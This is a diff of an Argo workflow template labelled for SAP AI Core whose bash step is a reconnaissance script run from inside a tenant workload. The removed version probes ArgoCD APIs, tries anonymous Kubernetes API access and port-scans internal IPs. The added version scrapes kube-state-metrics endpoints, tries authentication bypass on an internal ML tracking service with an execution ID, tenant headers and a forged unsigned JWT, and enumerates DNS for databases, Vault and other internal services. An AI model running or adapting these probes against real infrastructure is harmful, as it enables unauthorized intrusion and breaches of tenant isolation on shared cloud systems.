@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "16.0.0"
+    ai.sap.com/version: "17.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,119 +24,88 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V16 INTERNAL SERVICES PROBE ==="
+        echo "=== V17 KSM + ML-TRACKING PROBE ==="
         
-        # === ARGOCD SERVER ===
-        echo "=== ARGOCD SERVER (100.107.174.75) ==="
+        # === KUBE-STATE-METRICS (KSM) - THE P1 FINDING ===
+        echo "=== KSM PROBES ==="
         
-        echo "--- ArgoCD API version ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/version" 2>&1 | head -c 500
-        echo ""
-        
-        echo "--- ArgoCD settings ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/settings" 2>&1 | head -c 1000
-        echo ""
-        
-        echo "--- ArgoCD applications ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/applications" 2>&1 | head -c 3000
-        echo ""
-        
-        echo "--- ArgoCD clusters ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/clusters" 2>&1 | head -c 2000
-        echo ""
-        
-        echo "--- ArgoCD repositories ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/repositories" 2>&1 | head -c 2000
-        echo ""
-        
-        echo "--- ArgoCD projects ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/projects" 2>&1 | head -c 2000
-        echo ""
-        
-        echo "--- ArgoCD accounts ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/account" 2>&1 | head -c 500
-        echo ""
-        
-        echo "--- ArgoCD session info ---"
-        curl -sk --connect-timeout 5 "https://100.107.174.75/api/v1/session/userinfo" 2>&1 | head -c 500
-        echo ""
-        
-        # === ARGOCD REPO SERVER ===
-        echo "=== ARGOCD REPO SERVER (100.107.39.134) ==="
-        
-        echo "--- HTTP probe ---"
-        curl -sk --connect-timeout 5 "https://100.107.39.134:8081/" 2>&1 | head -c 500
-        echo ""
-        curl -sk --connect-timeout 5 "http://100.107.39.134:8081/" 2>&1 | head -c 500
-        echo ""
-        
-        # gRPC probe
-        which grpcurl >/dev/null 2>&1 && {
-          echo "--- gRPC services ---"
-          grpcurl -plaintext -connect-timeout 5 100.107.39.134:8081 list 2>&1 | head -c 1000
+        # Known KSM endpoints from prior runs
+        for ksm_host in           "ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "kube-state-metrics.monitoring.svc.cluster.local:8080"           "kube-state-metrics.kube-system.svc.cluster.local:8080"; do
+          echo "--- KSM: $ksm_host ---"
+          RESP=$(curl -s --connect-timeout 5 "http://${ksm_host}/metrics" 2>&1 | head -c 3000)
+          BYTES=$(echo "$RESP" | wc -c)
+          echo "BYTES=$BYTES"
+          echo "$RESP" | head -30
+          echo "..."
           echo ""
-        }
+        done
+        
+        # === KSM via direct IP (bypass DNS) ===
+        echo "=== KSM DIRECT IP ==="
+        # Resolve KSM DNS
+        for ksm_host in           "ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local"           "ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local"           "ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local"; do
+          IP=$(dig +short "$ksm_host" 2>/dev/null | head -1)
+          echo "DNS: $ksm_host = ${IP:-NXDOMAIN}"
+          if [ -n "$IP" ]; then
+            RESP=$(curl -s --connect-timeout 5 "http://${IP}:8080/metrics" 2>&1 | wc -c)
+            echo "  Direct IP: $RESP bytes"
+          fi
+        done
         
         # === ML TRACKING SERVICE ===
-        echo "=== ML TRACKING SERVICE ==="
+        echo "=== ML TRACKING ==="
+        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
         
-        echo "--- Health ---"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/health" 2>&1 | head -c 500
+        # Try with execution ID as bearer token
+        echo "--- With execution ID as token ---"
+        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer $AICORE_EXECUTION_ID" 2>&1 | head -c 300
         echo ""
         
-        echo "--- Root ---"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 500
+        # Try with tenant ID
+        echo "--- With tenant header ---"
+        curl -s --connect-timeout 5 "$TRACK/" -H "AI-Main-Tenant: $AI_MAIN_TENANT" -H "AI-Resource-Group: $AI_RESOURCE_GROUP" 2>&1 | head -c 300
         echo ""
         
-        echo "--- API info ---"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/info" 2>&1 | head -c 500
+        # Try with a fabricated JWT-looking token
+        echo "--- With fake JWT ---"
+        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0." 2>&1 | head -c 300
         echo ""
         
-        echo "--- Metrics (all executions) ---"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/metrics" 2>&1 | head -c 3000
-        echo ""
+        # Try without auth (different paths)
+        echo "--- No auth paths ---"
+        for path in "/health" "/healthz" "/ready" "/readyz" "/metrics" "/swagger" "/api-docs" "/openapi.json" "/api/v1" "/api/v1/info" "/api/v1/health"; do
+          RESP=$(curl -s --connect-timeout 3 "${TRACK}${path}" 2>&1 | head -c 200)
+          [ -n "$RESP" ] && echo "  ${path}: ${RESP}"
+        done
         
-        echo "--- Experiments ---"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/experiments" 2>&1 | head -c 2000
-        echo ""
-        
-        echo "--- Runs ---"
-        curl -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/v1/runs" 2>&1 | head -c 2000
-        echo ""
-        
-        # === DNS ENUMERATION ===
-        echo "=== DNS ENUM ==="
-        for ns in ml-tracking argocd argo kube-system monitoring istio-system default cert-manager; do
-          echo "NS: $ns"
-          dig +short "*.${ns}.svc.cluster.local" 2>/dev/null | head -5
-          # Try common service names
-          for svc in prometheus grafana loki kube-state-metrics alertmanager istio-pilot coredns etcd; do
+        # === PROMETHEUS / GRAFANA DISCOVERY ===
+        echo "=== PROMETHEUS/GRAFANA ==="
+        for svc in prometheus-server prometheus grafana; do
+          for ns in monitoring opentelemetry platform-tests kube-system; do
             IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
-            [ -n "$IP" ] && echo "  FOUND: ${svc}.${ns} = $IP"
+            [ -n "$IP" ] && {
+              echo "FOUND: ${svc}.${ns} = $IP"
+              curl -s --connect-timeout 3 "http://${IP}:9090/-/healthy" 2>&1 | head -c 200
+              curl -s --connect-timeout 3 "http://${IP}:3000/api/health" 2>&1 | head -c 200
+              echo ""
+            }
           done
         done
         
-        # === KUBERNETES API WITHOUT TOKEN ===
-        echo "=== K8S API (no auth) ==="
-        K8S="https://api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
-        curl -sk --connect-timeout 5 "$K8S/api" 2>&1 | head -c 500
-        echo ""
-        curl -sk --connect-timeout 5 "$K8S/version" 2>&1 | head -c 500
-        echo ""
-        curl -sk --connect-timeout 5 "$K8S/healthz" 2>&1 | head -c 500
-        echo ""
+        # === OPENTELEMETRY SERVICES ===
+        echo "=== OPENTELEMETRY NS ==="
+        for svc in otel-collector jaeger zipkin fluentbit fluent-bit; do
+          IP=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$IP" ] && echo "FOUND: ${svc}.opentelemetry = $IP"
+        done
         
-        # Try anonymous access
-        curl -sk --connect-timeout 5 "$K8S/api/v1/namespaces" 2>&1 | head -c 500
-        echo ""
-        
-        # === NETWORK SCAN: find more services ===
-        echo "=== QUICK PORT SCAN ==="
-        for ip in 100.107.174.75 100.107.39.134 100.104.0.1 100.104.0.10; do
-          echo "IP: $ip"
-          for port in 80 443 8080 8443 9090 3000 6379 2379 9093 15010 15014 8081; do
-            timeout 2 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null && echo "  OPEN: $ip:$port"
+        # === BROADER DNS ENUM ===
+        echo "=== EXPANDED DNS ==="
+        for svc in           "redis-master" "redis" "postgresql" "postgres" "mongodb" "mongo"           "elasticsearch" "es" "kibana" "logstash"           "vault" "consul" "minio" "s3"           "istio-ingressgateway" "istiod"           "nginx-ingress-controller" "traefik"           "aicore-server" "ai-launchpad" "user-management"; do
+          for ns in default istio-system istio-networking kube-system aicore argo cert-manager couchdb endpoint-service platform-tests connectivity-proxy user-management not-diamond fluent-bit; do
+            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
+            [ -n "$IP" ] && echo "FOUND: ${svc}.${ns} = $IP"
           done
         done
         
-        echo "=== V16 COMPLETE ==="
+        echo "=== V17 COMPLETE ==="
